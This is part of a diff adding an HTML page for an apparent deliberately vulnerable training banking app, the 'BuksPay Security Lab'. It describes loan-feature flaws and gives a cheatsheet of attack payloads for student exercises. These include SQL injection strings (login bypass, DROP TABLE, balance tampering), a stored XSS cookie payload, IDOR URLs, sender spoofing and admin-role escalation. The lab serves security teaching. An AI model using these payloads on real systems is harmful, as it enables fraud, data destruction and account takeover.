+        <div class="vuln-feature">Loan / Credit Request</div>
+      </div>
+      <div class="vuln-tags">
+        <span class="vuln-tag-pill tag-a01">A01</span>
+        <span class="vuln-tag-pill tag-a03">A03</span>
+        <span class="vuln-tag-pill tag-a05">A05</span>
+        <span class="vuln-tag-pill tag-a07">A07</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-item">
+        <div class="vuln-item-label">A07 · No Auth</div>
+        <div class="vuln-item-content">
+          <strong>Loan submission requires no authentication.</strong> POST a loan application with any <code style="font-family:'JetBrains Mono';font-size:12px;">userId</code> — the server inserts it with no session check.
+          <div class="code-block"><code><span class="b">POST</span> /api/loans
+{ <span class="b">"userId"</span>: <span class="a">"2"</span>, <span class="b">"amount"</span>: <span class="a">50000</span>, <span class="b">"purpose"</span>: <span class="a">"..."</span>,
+  <span class="b">"employment"</span>: <span class="a">"Employed"</span>, <span class="b">"monthlyIncome"</span>: <span class="a">100000</span> }</code></div>
+        </div>
+      </div>
+      <div class="vuln-item">
+        <div class="vuln-item-label">A01 · Auto-approve</div>
+        <div class="vuln-item-content">
+          <strong>?isVIP=true immediately approves the loan and credits the full amount to the user's balance.</strong> No admin review. Works for any userId.
+          <div class="code-block"><code><span class="b">POST</span> /api/loans<span class="a">?isVIP=true</span>
+{ <span class="b">"userId"</span>: <span class="a">"1"</span>, <span class="b">"amount"</span>: <span class="a">999999</span>, ... }</code></div>
+        </div>
+      </div>
+      <div class="vuln-item">
+        <div class="vuln-item-label">A03 · SQLi in Purpose</div>
+        <div class="vuln-item-content">
+          The <code style="font-family:'JetBrains Mono';font-size:12px;">purpose</code> and <code style="font-family:'JetBrains Mono';font-size:12px;">employment</code> fields are concatenated into the INSERT — classic in-band injection:
+          <div class="code-block"><code><span class="a">business', 'approved'); UPDATE users SET balance=99999 WHERE id=1;--</span></code></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <hr class="section-divider" />
+
+  <!-- ── 3. QUICK REFERENCE CHEATSHEET ──────────── -->
+  <div class="section-eyebrow">Section 03</div>
+  <h2 class="section-title">Quick-Reference Cheatsheet</h2>
+  <p class="section-desc">
+    All attacks in one table for use during live demos or student exercises.
+  </p>
+
+  <div class="cheat-wrap">
+    <table class="cheat-table">
+      <thead>
+        <tr>
+          <th>OWASP</th>
+          <th>Feature</th>
+          <th>Attack</th>
+          <th>Payload / URL</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>A03</td>
+          <td>Login</td>
+          <td>SQL injection — auth bypass</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">username: alice'--</code></td>
+        </tr>
+        <tr>
+          <td>A07</td>
+          <td>Login</td>
+          <td>Username enumeration</td>
+          <td>Compare error messages: "Wrong password" vs "Username not found"</td>
+        </tr>
+        <tr>
+          <td>A02</td>
+          <td>Login / All</td>
+          <td>MD5 hash crack</td>
+          <td>Paste any hash from API response into crackstation.net</td>
+        </tr>
+        <tr>
+          <td>A01</td>
+          <td>Dashboard</td>
+          <td>IDOR — view any account</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">/api/dashboard?userId=2</code></td>
+        </tr>
+        <tr>
+          <td>A01</td>
+          <td>Transfer</td>
+          <td>Spoof sender — steal funds</td>
+          <td>Set <code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">fromUserId</code> in POST body to victim's ID</td>
+        </tr>
+        <tr>
+          <td>A03</td>
+          <td>Transfer</td>
+          <td>SQL injection in memo</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">memo: x'); DROP TABLE transactions;--</code></td>
+        </tr>
+        <tr>
+          <td>A05</td>
+          <td>Transfer</td>
+          <td>CSRF — cross-origin transfer</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">fetch('/api/transfer', {credentials:'include'})</code></td>
+        </tr>
+        <tr>
+          <td>A01</td>
+          <td>Beneficiaries</td>
+          <td>IDOR — view/delete any list</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">/api/beneficiaries?userId=2</code> &nbsp;|&nbsp; <code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">DELETE ?id=1</code></td>
+        </tr>
+        <tr>
+          <td>A03</td>
+          <td>Beneficiaries</td>
+          <td>UNION injection via search</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">search=%25' UNION SELECT ...</code></td>
+        </tr>
+        <tr>
+          <td>A07</td>
+          <td>Profile</td>
+          <td>Change any user's password</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">PUT /api/profile {newPassword, userId}</code></td>
+        </tr>
+        <tr>
+          <td>A01</td>
+          <td>Admin</td>
+          <td>Full data dump — no login</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">/api/admin?admin=true</code></td>
+        </tr>
+        <tr>
+          <td>A01</td>
+          <td>Admin</td>
+          <td>Elevate to admin role</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">POST /api/admin {action:"changeRole",userId,role:"admin"}</code></td>
+        </tr>
+        <tr>
+          <td>A03</td>
+          <td>Transactions</td>
+          <td>ORDER BY injection</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">/api/transactions?filter=1;DROP TABLE users--</code></td>
+        </tr>
+        <tr>
+          <td>A03</td>
+          <td>Transactions</td>
+          <td>Stored XSS via memo</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">&lt;img src=x onerror=alert(document.cookie)&gt;</code></td>
+        </tr>
+        <tr>
+          <td>A07</td>
+          <td>Loans</td>
+          <td>Submit loan without auth</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">POST /api/loans {userId:"2", amount:...}</code></td>
+        </tr>
+        <tr>
+          <td>A01</td>
+          <td>Loans</td>
+          <td>Auto-approve &amp; credit balance</td>
+          <td><code style="font-family:'JetBrains Mono';font-size:12px;background:#F3F2EF;padding:2px 5px;border-radius:3px;">POST /api/loans?isVIP=true {userId, amount:999999}</code></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <hr class="section-divider" />
+
+  <!-- ── Footer ──────────────────────────────── -->
+  <div style="display:flex;align-items:center;justify-content:space-between;padding-top:0;">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <div style="width:28px;height:28px;background:#0A1628;border-radius:7px;display:flex;align-items:center;justify-content:center;">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <span style="font-family:'Fraunces',serif;font-size:16px;color:var(--ink);">BuksPay Security Lab</span>
+    </div>
+    <p style="font-size:12px;color:var(--ink-3);font-family:'JetBrains Mono',monospace;">
+      For educational use only · Do not deploy publicly without isolation
+    </p>
+  </div>
+
+</div><!-- /page -->
+</body>
+</html>
